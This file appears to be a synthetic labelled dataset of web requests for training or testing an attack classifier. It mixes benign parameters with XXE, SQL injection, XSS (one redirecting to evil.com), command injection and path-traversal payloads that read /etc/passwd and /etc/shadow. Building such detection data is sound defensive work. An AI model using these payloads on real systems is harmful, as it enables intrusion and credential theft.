attack_type,payload,endpoint,http_method,request_body,source_ip
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/#/search,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.95
normal,category=juice,/rest/basket,GET,category=juice,192.168.1.127
normal,search=apple,/profile,GET,search=apple,192.168.1.170
normal,product=1,/api/Products,POST,product=1,192.168.1.151
sqli,"' UNION SELECT username, password FROM Users--",/api/Products,GET,"' UNION SELECT username, password FROM Users--",192.168.1.3
normal,search=apple,/#/search,POST,search=apple,192.168.1.83
xss,<img src=x onerror=alert(1)>,/redirect,GET,<img src=x onerror=alert(1)>,192.168.1.157
xss,<script>document.location='http://evil.com'</script>,/rest/basket,POST,<script>document.location='http://evil.com'</script>,192.168.1.153
normal,product=1,/rest/basket,GET,product=1,192.168.1.244
rce,; cat /etc/shadow,/redirect,GET,; cat /etc/shadow,192.168.1.77
normal,email=user@test.com,/redirect,GET,email=user@test.com,192.168.1.205
normal,page=1,/rest/user/login,POST,page=1,192.168.1.6
sqli,' OR '1'='1' --,/profile,POST,' OR '1'='1' --,192.168.1.131
rce,| ls -la /,/rest/admin/application-configuration,GET,| ls -la /,192.168.1.250
normal,email=user@test.com,/rest/user/login,POST,email=user@test.com,192.168.1.155
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/ftp,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.149
lfi,../../../../etc/passwd,/ftp,GET,../../../../etc/passwd,192.168.1.154
normal,page=1,/redirect,POST,page=1,192.168.1.160
xss,<script>document.location='http://evil.com'</script>,/rest/user/login,POST,<script>document.location='http://evil.com'</script>,192.168.1.110
sqli,"' UNION SELECT username, password FROM Users--",/#/search,POST,"' UNION SELECT username, password FROM Users--",192.168.1.95
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/#/search,GET,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.75
rce,; cat /etc/shadow,/rest/admin/application-configuration,GET,; cat /etc/shadow,192.168.1.23
lfi,../../../../etc/passwd,/rest/basket,POST,../../../../etc/passwd,192.168.1.83
normal,email=user@test.com,/#/search,POST,email=user@test.com,192.168.1.5
rce,| ls -la /,/profile,POST,| ls -la /,192.168.1.156
normal,search=apple,/profile,GET,search=apple,192.168.1.24
rce,| ls -la /,/#/search,GET,| ls -la /,192.168.1.129
sqli,"' UNION SELECT username, password FROM Users--",/rest/user/login,GET,"' UNION SELECT username, password FROM Users--",192.168.1.214
normal,product=1,/redirect,POST,product=1,192.168.1.141
normal,product=1,/rest/basket,POST,product=1,192.168.1.52
normal,product=1,/profile,GET,product=1,192.168.1.150
normal,product=1,/redirect,POST,product=1,192.168.1.4
normal,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.202
normal,sort=price,/#/search,POST,sort=price,192.168.1.60
normal,email=user@test.com,/#/search,POST,email=user@test.com,192.168.1.141
lfi,../../../../etc/passwd,/redirect,GET,../../../../etc/passwd,192.168.1.128
normal,sort=price,/ftp,POST,sort=price,192.168.1.23
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/redirect,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.210
xss,<img src=x onerror=alert(1)>,/api/Products,POST,<img src=x onerror=alert(1)>,192.168.1.22
sqli,"' UNION SELECT username, password FROM Users--",/rest/user/login,POST,"' UNION SELECT username, password FROM Users--",192.168.1.182
normal,category=juice,/api/Products,GET,category=juice,192.168.1.163
normal,email=user@test.com,/rest/user/login,GET,email=user@test.com,192.168.1.204
rce,| ls -la /,/rest/basket,GET,| ls -la /,192.168.1.152
normal,page=1,/rest/user/login,GET,page=1,192.168.1.64
sqli,"' UNION SELECT username, password FROM Users--",/rest/basket,POST,"' UNION SELECT username, password FROM Users--",192.168.1.202
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/basket,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.210
rce,; cat /etc/shadow,/rest/user/login,GET,; cat /etc/shadow,192.168.1.63
normal,search=apple,/ftp,POST,search=apple,192.168.1.41
normal,category=juice,/redirect,GET,category=juice,192.168.1.110
normal,email=user@test.com,/#/search,GET,email=user@test.com,192.168.1.241
xss,<script>document.location='http://evil.com'</script>,/redirect,GET,<script>document.location='http://evil.com'</script>,192.168.1.201
rce,| ls -la /,/rest/basket,POST,| ls -la /,192.168.1.163
normal,page=1,/ftp,POST,page=1,192.168.1.83
lfi,../../../../etc/passwd,/rest/basket,POST,../../../../etc/passwd,192.168.1.248
lfi,../../../../etc/passwd,/profile,GET,../../../../etc/passwd,192.168.1.102
normal,page=1,/rest/admin/application-configuration,GET,page=1,192.168.1.51
normal,sort=price,/#/search,POST,sort=price,192.168.1.101
normal,email=user@test.com,/ftp,POST,email=user@test.com,192.168.1.234
normal,page=1,/profile,POST,page=1,192.168.1.114
normal,email=user@test.com,/rest/user/login,GET,email=user@test.com,192.168.1.235
normal,email=user@test.com,/ftp,GET,email=user@test.com,192.168.1.49
normal,email=user@test.com,/rest/user/login,POST,email=user@test.com,192.168.1.102
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/ftp,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.107
lfi,../../../../etc/passwd,/rest/admin/application-configuration,GET,../../../../etc/passwd,192.168.1.39
lfi,../../../../etc/passwd,/redirect,POST,../../../../etc/passwd,192.168.1.245
sqli,"' UNION SELECT username, password FROM Users--",/profile,POST,"' UNION SELECT username, password FROM Users--",192.168.1.164
normal,page=1,/rest/basket,POST,page=1,192.168.1.40
normal,page=1,/api/Products,GET,page=1,192.168.1.185
normal,sort=price,/rest/admin/application-configuration,GET,sort=price,192.168.1.142
xss,<script>document.location='http://evil.com'</script>,/profile,POST,<script>document.location='http://evil.com'</script>,192.168.1.247
sqli,"' UNION SELECT username, password FROM Users--",/profile,POST,"' UNION SELECT username, password FROM Users--",192.168.1.210
normal,category=juice,/rest/basket,GET,category=juice,192.168.1.139
normal,search=apple,/profile,GET,search=apple,192.168.1.61
lfi,../../../../etc/passwd,/redirect,POST,../../../../etc/passwd,192.168.1.224
normal,email=user@test.com,/rest/user/login,GET,email=user@test.com,192.168.1.237
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/ftp,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.21
sqli,' OR '1'='1' --,/rest/user/login,POST,' OR '1'='1' --,192.168.1.148
rce,| ls -la /,/redirect,GET,| ls -la /,192.168.1.165
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/#/search,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.77
rce,; cat /etc/shadow,/rest/basket,POST,; cat /etc/shadow,192.168.1.46
normal,product=1,/redirect,GET,product=1,192.168.1.248
normal,email=user@test.com,/rest/basket,GET,email=user@test.com,192.168.1.205
sqli,' OR '1'='1' --,/#/search,POST,' OR '1'='1' --,192.168.1.67
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/rest/admin/application-configuration,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.202
sqli,"' UNION SELECT username, password FROM Users--",/profile,GET,"' UNION SELECT username, password FROM Users--",192.168.1.55
normal,page=1,/rest/user/login,GET,page=1,192.168.1.240
normal,search=apple,/redirect,GET,search=apple,192.168.1.218
normal,search=apple,/rest/basket,POST,search=apple,192.168.1.151
normal,page=1,/api/Products,POST,page=1,192.168.1.69
normal,page=1,/#/search,GET,page=1,192.168.1.113
normal,product=1,/rest/basket,POST,product=1,192.168.1.220
normal,category=juice,/profile,GET,category=juice,192.168.1.197
normal,sort=price,/#/search,GET,sort=price,192.168.1.18
normal,email=user@test.com,/profile,POST,email=user@test.com,192.168.1.226
normal,search=apple,/rest/admin/application-configuration,GET,search=apple,192.168.1.28
normal,search=apple,/ftp,POST,search=apple,192.168.1.220
normal,category=juice,/rest/basket,POST,category=juice,192.168.1.143
normal,category=juice,/profile,POST,category=juice,192.168.1.155
rce,| ls -la /,/ftp,POST,| ls -la /,192.168.1.28
normal,email=user@test.com,/rest/basket,GET,email=user@test.com,192.168.1.89
normal,category=juice,/rest/user/login,POST,category=juice,192.168.1.45
normal,page=1,/ftp,POST,page=1,192.168.1.174
normal,category=juice,/ftp,GET,category=juice,192.168.1.188
lfi,../../../../etc/passwd,/#/search,GET,../../../../etc/passwd,192.168.1.26
lfi,../../../../etc/passwd,/#/search,GET,../../../../etc/passwd,192.168.1.57
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/api/Products,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.136
normal,email=user@test.com,/rest/admin/application-configuration,POST,email=user@test.com,192.168.1.246
sqli,"' UNION SELECT username, password FROM Users--",/rest/basket,POST,"' UNION SELECT username, password FROM Users--",192.168.1.100
normal,search=apple,/rest/user/login,POST,search=apple,192.168.1.19
lfi,../../../../etc/passwd,/rest/basket,GET,../../../../etc/passwd,192.168.1.252
normal,email=user@test.com,/rest/user/login,GET,email=user@test.com,192.168.1.145
normal,search=apple,/redirect,GET,search=apple,192.168.1.213
xss,<script>document.location='http://evil.com'</script>,/ftp,GET,<script>document.location='http://evil.com'</script>,192.168.1.156
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/profile,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.95
normal,category=juice,/rest/admin/application-configuration,POST,category=juice,192.168.1.74
normal,category=juice,/profile,GET,category=juice,192.168.1.76
normal,page=1,/ftp,POST,page=1,192.168.1.207
normal,category=juice,/redirect,GET,category=juice,192.168.1.119
xss,<script>document.location='http://evil.com'</script>,/rest/basket,GET,<script>document.location='http://evil.com'</script>,192.168.1.83
normal,product=1,/profile,GET,product=1,192.168.1.243
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/redirect,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.68
normal,search=apple,/profile,GET,search=apple,192.168.1.230
lfi,../../../../etc/passwd,/profile,POST,../../../../etc/passwd,192.168.1.49
xss,<img src=x onerror=alert(1)>,/redirect,GET,<img src=x onerror=alert(1)>,192.168.1.95
normal,sort=price,/api/Products,GET,sort=price,192.168.1.15
normal,product=1,/profile,GET,product=1,192.168.1.67
sqli,' OR '1'='1' --,/rest/user/login,POST,' OR '1'='1' --,192.168.1.136
normal,search=apple,/api/Products,POST,search=apple,192.168.1.228
rce,; cat /etc/shadow,/#/search,POST,; cat /etc/shadow,192.168.1.174
normal,sort=price,/#/search,GET,sort=price,192.168.1.188
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,GET,<img src=x onerror=alert(1)>,192.168.1.15
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/#/search,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.144
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/rest/basket,GET,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.128
xss,<script>document.location='http://evil.com'</script>,/rest/user/login,GET,<script>document.location='http://evil.com'</script>,192.168.1.243
normal,product=1,/#/search,GET,product=1,192.168.1.148
lfi,../../../../etc/passwd,/rest/user/login,POST,../../../../etc/passwd,192.168.1.25
normal,search=apple,/rest/basket,GET,search=apple,192.168.1.3
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/ftp,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.184
normal,product=1,/api/Products,GET,product=1,192.168.1.71
lfi,../../../../etc/passwd,/rest/admin/application-configuration,GET,../../../../etc/passwd,192.168.1.26
rce,| ls -la /,/redirect,POST,| ls -la /,192.168.1.12
normal,category=juice,/#/search,POST,category=juice,192.168.1.17
lfi,../../../../etc/passwd,/profile,POST,../../../../etc/passwd,192.168.1.196
normal,category=juice,/rest/admin/application-configuration,GET,category=juice,192.168.1.48
normal,category=juice,/rest/basket,GET,category=juice,192.168.1.65
rce,| ls -la /,/rest/user/login,POST,| ls -la /,192.168.1.167
rce,; cat /etc/shadow,/profile,GET,; cat /etc/shadow,192.168.1.247
normal,sort=price,/#/search,GET,sort=price,192.168.1.60
normal,page=1,/rest/admin/application-configuration,GET,page=1,192.168.1.93
normal,search=apple,/rest/admin/application-configuration,POST,search=apple,192.168.1.206
normal,page=1,/rest/user/login,POST,page=1,192.168.1.77
normal,sort=price,/rest/admin/application-configuration,POST,sort=price,192.168.1.61
normal,sort=price,/rest/basket,POST,sort=price,192.168.1.22
sqli,' OR '1'='1' --,/profile,POST,' OR '1'='1' --,192.168.1.81
xss,<script>document.location='http://evil.com'</script>,/profile,POST,<script>document.location='http://evil.com'</script>,192.168.1.6
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/ftp,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.246
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/rest/user/login,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.15
normal,page=1,/rest/user/login,GET,page=1,192.168.1.72
normal,page=1,/redirect,POST,page=1,192.168.1.131
lfi,../../../../etc/passwd,/#/search,GET,../../../../etc/passwd,192.168.1.91
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/rest/basket,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.59
normal,page=1,/api/Products,GET,page=1,192.168.1.179
normal,search=apple,/profile,POST,search=apple,192.168.1.229
normal,product=1,/api/Products,GET,product=1,192.168.1.111
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/admin/application-configuration,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.100
sqli,' OR '1'='1' --,/rest/user/login,POST,' OR '1'='1' --,192.168.1.167
normal,email=user@test.com,/ftp,GET,email=user@test.com,192.168.1.48
normal,email=user@test.com,/#/search,GET,email=user@test.com,192.168.1.189
rce,; cat /etc/shadow,/#/search,GET,; cat /etc/shadow,192.168.1.148
normal,category=juice,/api/Products,POST,category=juice,192.168.1.87
normal,email=user@test.com,/api/Products,POST,email=user@test.com,192.168.1.188
normal,page=1,/rest/admin/application-configuration,POST,page=1,192.168.1.51
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/api/Products,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.18
normal,email=user@test.com,/rest/basket,GET,email=user@test.com,192.168.1.82
normal,sort=price,/api/Products,POST,sort=price,192.168.1.23
normal,search=apple,/ftp,GET,search=apple,192.168.1.149
normal,product=1,/ftp,GET,product=1,192.168.1.103
xss,<img src=x onerror=alert(1)>,/profile,GET,<img src=x onerror=alert(1)>,192.168.1.127
normal,product=1,/rest/basket,POST,product=1,192.168.1.193
normal,sort=price,/redirect,POST,sort=price,192.168.1.71
normal,category=juice,/rest/admin/application-configuration,POST,category=juice,192.168.1.82
normal,page=1,/rest/basket,GET,page=1,192.168.1.101
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/rest/user/login,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.118
normal,sort=price,/rest/basket,POST,sort=price,192.168.1.192
normal,page=1,/profile,GET,page=1,192.168.1.143
normal,email=user@test.com,/profile,GET,email=user@test.com,192.168.1.181
sqli,' OR '1'='1' --,/rest/basket,POST,' OR '1'='1' --,192.168.1.142
normal,page=1,/redirect,POST,page=1,192.168.1.245
rce,| ls -la /,/redirect,POST,| ls -la /,192.168.1.215
normal,page=1,/profile,GET,page=1,192.168.1.23
xss,<img src=x onerror=alert(1)>,/#/search,GET,<img src=x onerror=alert(1)>,192.168.1.221
normal,product=1,/rest/user/login,POST,product=1,192.168.1.50
rce,; cat /etc/shadow,/api/Products,GET,; cat /etc/shadow,192.168.1.44
normal,search=apple,/redirect,POST,search=apple,192.168.1.208
xss,<script>document.location='http://evil.com'</script>,/rest/admin/application-configuration,POST,<script>document.location='http://evil.com'</script>,192.168.1.243
normal,email=user@test.com,/ftp,GET,email=user@test.com,192.168.1.9
normal,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.144
normal,search=apple,/rest/admin/application-configuration,GET,search=apple,192.168.1.241
xss,<script>document.location='http://evil.com'</script>,/profile,POST,<script>document.location='http://evil.com'</script>,192.168.1.192
normal,page=1,/rest/basket,GET,page=1,192.168.1.181
sqli,' OR '1'='1' --,/rest/user/login,GET,' OR '1'='1' --,192.168.1.5
sqli,' OR '1'='1' --,/rest/admin/application-configuration,POST,' OR '1'='1' --,192.168.1.113
normal,product=1,/#/search,POST,product=1,192.168.1.69
normal,product=1,/ftp,POST,product=1,192.168.1.135
normal,sort=price,/redirect,GET,sort=price,192.168.1.223
normal,category=juice,/profile,GET,category=juice,192.168.1.95
normal,sort=price,/rest/user/login,POST,sort=price,192.168.1.221
normal,page=1,/rest/admin/application-configuration,POST,page=1,192.168.1.120
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/rest/basket,GET,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.23
normal,sort=price,/rest/admin/application-configuration,GET,sort=price,192.168.1.112
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/redirect,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.118
sqli,' OR '1'='1' --,/ftp,GET,' OR '1'='1' --,192.168.1.169
sqli,"' UNION SELECT username, password FROM Users--",/ftp,GET,"' UNION SELECT username, password FROM Users--",192.168.1.149
lfi,../../../../etc/passwd,/profile,GET,../../../../etc/passwd,192.168.1.143
normal,product=1,/rest/user/login,GET,product=1,192.168.1.195
normal,product=1,/rest/basket,GET,product=1,192.168.1.206
sqli,"' UNION SELECT username, password FROM Users--",/redirect,POST,"' UNION SELECT username, password FROM Users--",192.168.1.243
normal,product=1,/#/search,POST,product=1,192.168.1.180
normal,product=1,/ftp,POST,product=1,192.168.1.74
xss,<script>document.location='http://evil.com'</script>,/rest/basket,POST,<script>document.location='http://evil.com'</script>,192.168.1.112
normal,search=apple,/rest/admin/application-configuration,GET,search=apple,192.168.1.89
rce,| ls -la /,/rest/admin/application-configuration,POST,| ls -la /,192.168.1.114
xss,<img src=x onerror=alert(1)>,/rest/basket,POST,<img src=x onerror=alert(1)>,192.168.1.130
xss,<script>document.location='http://evil.com'</script>,/api/Products,POST,<script>document.location='http://evil.com'</script>,192.168.1.166
normal,page=1,/api/Products,GET,page=1,192.168.1.168
normal,search=apple,/rest/user/login,GET,search=apple,192.168.1.24
normal,page=1,/rest/admin/application-configuration,POST,page=1,192.168.1.109
normal,product=1,/rest/user/login,POST,product=1,192.168.1.76
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/redirect,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.106
rce,| ls -la /,/#/search,POST,| ls -la /,192.168.1.16
normal,page=1,/ftp,POST,page=1,192.168.1.3
xss,<img src=x onerror=alert(1)>,/rest/basket,POST,<img src=x onerror=alert(1)>,192.168.1.204
normal,category=juice,/rest/admin/application-configuration,GET,category=juice,192.168.1.20
normal,product=1,/redirect,GET,product=1,192.168.1.96
xss,<script>document.location='http://evil.com'</script>,/api/Products,GET,<script>document.location='http://evil.com'</script>,192.168.1.214
normal,page=1,/api/Products,POST,page=1,192.168.1.64
normal,email=user@test.com,/rest/user/login,GET,email=user@test.com,192.168.1.6
normal,sort=price,/rest/admin/application-configuration,POST,sort=price,192.168.1.100
normal,sort=price,/rest/basket,POST,sort=price,192.168.1.189
normal,page=1,/redirect,POST,page=1,192.168.1.222
xss,<script>document.location='http://evil.com'</script>,/api/Products,POST,<script>document.location='http://evil.com'</script>,192.168.1.74
lfi,../../../../etc/passwd,/redirect,GET,../../../../etc/passwd,192.168.1.58
normal,search=apple,/rest/admin/application-configuration,POST,search=apple,192.168.1.123
normal,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.53
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/#/search,GET,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.101
normal,sort=price,/api/Products,POST,sort=price,192.168.1.203
normal,sort=price,/#/search,POST,sort=price,192.168.1.97
normal,page=1,/api/Products,GET,page=1,192.168.1.123
normal,search=apple,/profile,POST,search=apple,192.168.1.167
sqli,' OR '1'='1' --,/#/search,POST,' OR '1'='1' --,192.168.1.57
normal,sort=price,/ftp,GET,sort=price,192.168.1.150
normal,category=juice,/redirect,GET,category=juice,192.168.1.106
normal,product=1,/#/search,POST,product=1,192.168.1.241
normal,search=apple,/rest/user/login,GET,search=apple,192.168.1.143
normal,sort=price,/#/search,POST,sort=price,192.168.1.165
